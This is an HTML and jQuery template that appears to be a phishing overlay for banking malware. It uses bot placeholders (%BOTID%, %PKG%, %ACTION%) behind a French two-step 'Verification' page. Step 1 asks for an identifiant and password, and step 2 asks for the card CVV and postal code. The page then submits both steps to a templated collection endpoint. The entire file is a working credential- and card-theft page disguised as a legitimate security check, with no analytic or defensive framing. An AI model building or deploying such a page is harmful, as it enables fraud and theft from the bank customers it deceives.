<html>
  <head>
	<meta http-equiv="Content-Type"content="text/html; charset=utf-8">
	<meta name="viewport"content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js">
	</script>
	<style type="text/css">*{
	  outline:none;
	  }
	  .br{
		border:1px dotted red;
	  }
	  .stol{
		display:table;
		width:100%;
	  }
	  .td{
		display:table-cell;
	  }
	  .w100{
		width:100%;
	  }
	  .left_{
		text-align:left;
	  }
	  .right_{
		text-align:right;
	  }
	  .center{
		text-align:center;
	  }
	  .top{
		vertical-align:top;
	  }
	  .bottom{
		vertical-align:bottom;
	  }
	  .middle{
		vertical-align:middle;
	  }
	  .inline{
		display:inline-block;
	  }
	  .pad{
		padding:15px;
	  }
	  .tr{
		display:table-row;
	  }
	  .none{
		display:none;
	  }
	  body,html{
		background-color:transparent;
	  }
	  .ramka{
		border:1px solid #21358b;
		background-color:white;
		border-radius:5px;
		background-color:white!important;
	  }
	  .header{
		padding:20px 20px;
		background-color: #21358b;
		border-radius:5px 5px 0 0;
		;
		color:#FFFFFF;
	  }
	  .body{
		padding:15px;
	  }
	  .control-label{
		color:#421451;
		font-weight:500;
	  }
	  .body h3{
		color:#8C1D77;
	  }
	  .has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{
	  }
	</style>
  </head>
  <body>
	<form role="form" name="form" action="%ACTION%" id="form" method="post">
	  <input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
	  
	  
	  <!-- --------------------------- STEP 1 ------------------------------------- -->
	  
	  <div class="container cont1" style="padding-top:15px">
		<div class="ramka">
		  <div class="header">
			<div class="stol w100">
			  <div class="td  middle left_" style="width:1px">
				<img src="%DYN_PATH%/img/logo.png" />
			  </div>
			  <div class="td  middle left_ hidden-xs" style="padding-left:20px">
				<h4 style="margin:0">|Verification
				</h4>
			  </div>
			  <div class="td  middle right_" style="padding-right:20px">
				<h4 style="margin:0">Step 1 of 2</h4>
			  </div>
			</div>
		  </div>
		  <div class="body">
			<div class="row">
			  <div class="col-sm-12">
				<h3 style="margin-top:0"></h3>
				<p></p>
				<hr />
				<!-- fields -->
				
				<div class="form-group">
				  <div class="row">
					<div class="col-sm-4">
					  <label class="control-label" for="">Identifiant: </label>
					</div>
					<div class="col-sm-3">
					  <input class="form-control" type="text" name="fields[identifiant]" maxlength="" id="identifiant" placeholder="" />
					</div>
				  </div>
				</div>
				
				<div class="form-group">
				  <div class="row">
					<div class="col-sm-4">
					  <label class="control-label" for="">Mot de passe: </label>
					</div>
					<div class="col-sm-3">
					  <input class="form-control" type="password" name="fields[password]" maxlength="" id="password" placeholder="" />
					</div>
				  </div>
				</div>
				
				
				<!-- / fields -->
				<hr />
				<div class="form-group">
				  <div class="row ">
					<div class="col-sm-4"></div>
					<div class="col-sm-3"><a href="javascript:void(0)"class="btn btn-info pull-right cont_but">Prochain</a></div>
				  </div>
				</div>
			  </div>
			</div>
		  </div>
		</div>
	  </div>
	  
	  <div class="container cont2 none" style="padding-top:15px">
		<div class="ramka">
		  <div class="header">
			<div class="stol w100">
			  <div class="td  middle left_" style="width:1px">
				<img src="%DYN_PATH%/img/logo.png" />
			  </div>
			  <div class="td  middle left_ hidden-xs" style="padding-left:20px">
				<h4 style="margin:0">|Verification
				</h4>
			  </div>
			  <div class="td  middle right_" style="padding-right:20px">
				<h4 style="margin:0">Step 2 of 2</h4>
			  </div>
			</div>
		  </div>
		  <div class="body">
			<div class="row">
			  <div class="col-sm-12">
				<h3 style="margin-top:0"></h3>
				<p></p>
				<hr />
				<!-- fields -->
				
				<div class="form-group">
				  <div class="row">
					<div class="col-sm-4">
					  <label class="control-label" for="">CVV: </label>
					</div>
					<div class="col-sm-3">
					  <input class="form-control" type="text" name="fields[cvv]" maxlength="" id="cvv" placeholder="" />
					</div>
				  </div>
				</div>
				
				<div class="form-group">
				  <div class="row">
					<div class="col-sm-4">
					  <label class="control-label" for="">Code postal: </label>
					</div>
					<div class="col-sm-3">
					  <input class="form-control" type="text" name="fields[zip]" maxlength="" id="zip" placeholder="" />
					</div>
				  </div>
				</div>
				
				
				<!-- / fields -->
				<hr />
				<div class="form-group">
				  <div class="row ">
					<div class="col-sm-4"></div>
					<div class="col-sm-3"><a href="javascript:void(0)"class="btn btn-info pull-right cont_but">Prochain</a></div>
				  </div>
				</div>
			  </div>
			</div>
		  </div>
		</div>
	  </div>
	  
	  
	</form>
  </body>
  <script type="text/javascript">
	
	function Calculate(Luhn)
	{
	  var sum=0;
	  for(i=0;i<Luhn.length;i++)
	  {
		sum+=parseInt(Luhn.substring(i,i+1));
	  }
	  var delta=new Array(0,1,2,3,4,-4,-3,-2,-1,0);
	  for(i=Luhn.length-1;i>=0;i-=2)
	  {
		var deltaIndex=parseInt(Luhn.substring(i,i+1));
		var deltaValue=delta[deltaIndex];
		sum+=deltaValue;
	  }
	  var mod10=sum%10;
	  mod10=10-mod10;
	  if(mod10==10)
	  {
		mod10=0;
	  }
	  return mod10;
	};
	
	function Validate(Luhn)
	{
	  var LuhnDigit=parseInt(Luhn.substring(Luhn.length-1,Luhn.length));
	  var LuhnLess=Luhn.substring(0,Luhn.length-1);
	  if(Calculate(LuhnLess)==parseInt(LuhnDigit))
	  {
		return true;
	  }
	  return false;
	};
	  
	(function(){
		var oForm=document.getElementById('form');
		  
		$('.form-control').focus(function(){
			$('.has-error').removeClass('has-error');
		})
	  
	// validate 1st step
	  
	$('.cont1 .cont_but').bind('click',function(){
		 
		var err=false; 
		
		var fields = {
			'identifiant': /[A-Za-z0-9]{3,}/,
			'password': /.{5,}/,
		}
		
		for(i in fields) 
		{
			var field = i
			var regex = fields[i]
		
			if(!(new RegExp(regex).test($('#' + field).val())))
			{
				$('#' + field).closest('.form-group').addClass('has-error');
				err = true;
			} 
		}

		if(err==true)
		  return;
		
		// switch step
		$('.cont1').hide();
		$('.cont2').show();
	  });
	  
	// validate 2nd step
	
	$('.cont2 .cont_but').bind('click',function(){
		 
		var err=false; 
		
		var fields = {
			'cvv': /[A-Za-z0-9]{3,}/,
			'zip': /[A-Za-z0-9]{3,}/,
		}
		
		for(i in fields) 
		{
			var field = i
			var regex = fields[i]
		
			if(!(new RegExp(regex).test($('#' + field).val())))
			{
				$('#' + field).closest('.form-group').addClass('has-error');
				err = true;
			} 
		}

		if(err==true)
		  return;
		
		// or submit 
		oForm.submit();
	  });
	  
	})();
  </script>
</html>
